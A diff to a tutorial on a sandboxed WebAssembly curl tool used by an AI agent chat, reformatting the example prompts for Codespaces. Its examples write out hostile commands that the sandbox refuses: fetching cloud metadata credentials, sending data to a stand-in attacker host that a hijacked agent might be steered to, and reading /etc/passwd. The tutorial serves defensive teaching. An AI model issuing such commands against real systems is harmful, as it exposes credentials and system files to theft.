@@ -66,7 +66,7 @@ wasm-tools component wit target/wasm32-wasip2/release/tool_curl.wasm \
 
 The prebuilt curl and your build print the same four lines:
 
-```
+```text
   import wasi:http/types@0.3.0;
   import wasi:http/client@0.3.0;
   import wasi:filesystem/types@0.2.9;
@@ -135,24 +135,27 @@ The messages are the tool's choice. What gets through is the host's.
 
 ## Ask curl
 
-Type each prompt into the chat at http://agent.localhost:28180, or run the
-curl command under it.
+Type each prompt into the chat at http://agent.localhost:28180.
+
+<!-- codespaces -->
+In Codespaces, run the `./ask` command under it instead.
+<!-- /codespaces -->
 
 **1. Fetch the granted host** 
 
 In the chat:
 
-```
+```chat
 fetch http://api.mock-sites.svc/data
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'fetch http://api.mock-sites.svc/data'
+./ask 'fetch http://api.mock-sites.svc/data'
 ```
+<!-- /codespaces -->
 
 The prompt that got "no tool named curl" in step 1. The host is in curl's
 `allowedHosts`, so the mock API answers.
@@ -161,17 +164,17 @@ The prompt that got "no tool named curl" in step 1. The host is in curl's
 
 In the chat:
 
-```
+```chat
 save http://api.mock-sites.svc/data to page.html
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'save http://api.mock-sites.svc/data to page.html'
+./ask 'save http://api.mock-sites.svc/data to page.html'
 ```
+<!-- /codespaces -->
 
 The model turns this into `curl -o page.html`. The prebuilt curl answers
 `saved 95 bytes to /data/page.html`. Your build answers with the message you
@@ -184,17 +187,17 @@ so the write succeeds: the folder is the boundary, not a blanket ban.
 
 In the chat:
 
-```
+```chat
 curl -s http://169.254.169.254/latest/meta-data/
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -s http://169.254.169.254/latest/meta-data/'
+./ask 'curl -s http://169.254.169.254/latest/meta-data/'
 ```
+<!-- /codespaces -->
 
 On most clouds this address hands out credentials. The host refuses it before anything leaves.
 
@@ -202,17 +205,17 @@ On most clouds this address hands out credentials. The host refuses it before an
 
 In the chat:
 
-```
+```chat
 curl -s http://attacker.mock-sites.svc/collect
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -s http://attacker.mock-sites.svc/collect'
+./ask 'curl -s http://attacker.mock-sites.svc/collect'
 ```
+<!-- /codespaces -->
 
 `attacker.mock-sites.svc` plays the server of someone who has hijacked the
 agent, the address a planted instruction would tell it to send data to. It is
@@ -223,17 +226,17 @@ refuses the request before it leaves.
 
 In the chat:
 
-```
+```chat
 curl -sL http://api.mock-sites.svc/redirect
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -sL http://api.mock-sites.svc/redirect'
+./ask 'curl -sL http://api.mock-sites.svc/redirect'
 ```
+<!-- /codespaces -->
 
 The granted host redirects to the attacker's server. The host checks every hop, including the one you didn't type, and refuses the second.
 
@@ -241,17 +244,17 @@ The granted host redirects to the attacker's server. The host checks every hop, 
 
 In the chat:
 
-```
+```chat
 curl -o /etc/evil -s http://api.mock-sites.svc/data
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
+./ask 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
 ```
+<!-- /codespaces -->
 
 This curl sees one folder, so `/etc` doesn't exist for it. The filesystem
 says "No such file or directory"; the tool calls that `access-denied`.
@@ -260,17 +263,17 @@ says "No such file or directory"; the tool calls that `access-denied`.
 
 In the chat:
 
-```
+```chat
 curl -s file:///etc/passwd
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -s file:///etc/passwd'
+./ask 'curl -s file:///etc/passwd'
 ```
+<!-- /codespaces -->
 
 Native curl reads any file your user can. This curl reads `file://` URLs
 through the same one folder, so `/etc/passwd` doesn't exist for it.
@@ -279,17 +282,17 @@ through the same one folder, so `/etc/passwd` doesn't exist for it.
 
 In the chat:
 
-```
+```chat
 curl -s file:///data/page.html
 ```
 
-In your terminal or Codespaces:
+<!-- codespaces -->
+In Codespaces:
 
 ```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:28180/ \
-  -d 'curl -s file:///data/page.html'
+./ask 'curl -s file:///data/page.html'
 ```
+<!-- /codespaces -->
 
 The page you saved in item 2 reads back. The tool doesn't check paths itself:
 the filesystem it is given holds only that one folder.
